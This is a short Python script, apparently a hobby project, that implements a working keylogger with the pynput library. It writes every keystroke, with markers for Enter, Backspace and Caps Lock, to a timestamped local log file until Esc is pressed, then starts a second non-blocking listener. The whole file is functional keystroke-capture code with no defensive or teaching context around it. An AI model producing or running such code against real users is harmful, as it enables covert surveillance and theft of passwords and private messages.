from pynput import keyboard
from datetime import datetime

current_datetime = datetime.now().strftime('%d-%m-%Y_%H%M%S')
file_name = "log_file_no-" + current_datetime + ".txt"

'''Path to save your log files
log_dir = r"E:\My programs\Projects\Capture the keyLogger"
logging.basicConfig(filename = (file_name), level=logging.INFO, format='%(message)s')
'''


def on_press(key):
    try:
        with open(file_name, "a") as f:
            f.write(key.char)
    except AttributeError:
        with open(file_name, "a") as f:
            if key == keyboard.Key.space:
                hotkey = " "
                f.write(hotkey)
            elif key == keyboard.Key.enter:
                hotkey = " [Enter] "
                f.write(hotkey)
            elif key == keyboard.Key.caps_lock:
                hotkey = "[CAPS_LOCK]"
                f.write(hotkey)
            elif key == keyboard.Key.backspace:
                hotkey = " [BackSpace] "
                f.write(hotkey)


def on_release(key):
    if key == keyboard.Key.esc:
        return False


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

# ...or, in a non-blocking fashion:
listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
